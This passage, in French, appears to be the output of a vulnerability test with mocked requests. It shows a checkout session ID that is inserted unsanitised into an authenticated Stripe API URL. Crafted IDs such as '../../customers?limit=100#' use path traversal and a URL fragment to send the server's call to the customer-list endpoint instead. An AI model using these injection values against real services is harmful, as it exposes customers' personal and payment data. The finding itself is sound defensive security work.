L'ID est injecte TEL QUEL dans l'URL authentifiee de l'API Stripe.

# [VULN] URL reellement appelee par le serveur (requests mocke) :

                                      chemin effectif : /v1/checkout/sessions/cs_test_legit123/line_items   <-- ID normal attendu
   id='../../customers#'           -> https://api.stripe.com/v1/checkout/sessions/../../customers#/line_items
                                      chemin effectif : /v1/checkout/sessions/../../customers/line_items   <-- remonte vers /v1/customers (liste clients)
   id='../../customers?limit=100#' -> https://api.stripe.com/v1/checkout/sessions/../../customers?limit=100#/line_items
                                      chemin effectif : /v1/checkout/sessions/../../customers   <-- liste 100 clients
